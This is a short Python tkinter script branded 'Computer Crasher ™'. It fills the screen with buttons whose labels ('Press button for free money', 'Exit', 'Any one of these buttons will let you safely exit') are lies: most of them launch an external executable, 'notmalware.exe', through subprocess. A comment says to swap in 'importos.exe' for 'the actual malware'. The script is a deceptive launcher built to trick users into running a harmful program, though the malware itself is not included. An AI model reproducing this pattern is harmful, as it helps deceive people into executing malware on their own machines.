import tkinter as tk
import subprocess
from tkinter import PhotoImage

def execute_program():
    if True:
        subprocess.run(["notmalware.exe"], shell=True)
        #change it to importos.exe if you want the actual malware
    
def execute_program2():
    if True:
        subprocess.run(["safe.exe"], shell=True)
    

root = tk.Tk()
root.title("Execute Program")
root.configure(bg="black")
root.geometry("1920x1080")
headingfont=("Helvetica",40)
otherfont=("ariel",15)

label = tk.Label(root, text="Computer Crasher ™",font=headingfont,bg="yellow",fg="blue")
label.pack(side="top", pady=10)

execute_button1 = tk.Button(root, text="Press button for free money", command=execute_program,fg="gold",bg="green")
execute_button1.pack(side="top", pady=100)
execute_button2 = tk.Button(root, text="Exit", command=execute_program,fg="red")
execute_button2.place(x=1220,y=600)
execute_button3= tk.Button(root, text="Dont press this↑", command=execute_program2,bg="red")
execute_button3.place(x=1180,y=0)
execute_button4= tk.Button(root, text="I'm out of ideas", command=execute_program)
execute_button4.place(x=100,y=200)
execute_button5= tk.Button(root, text="Any one of these buttons will let you safely exit this program",font=otherfont, command=execute_program,bg="black",fg="white")
execute_button5.place(x=200,y=500)

image = PhotoImage(file="image.png")
image_label = tk.Label(root, image=image,bg="black")
image_label.pack()

root.mainloop()
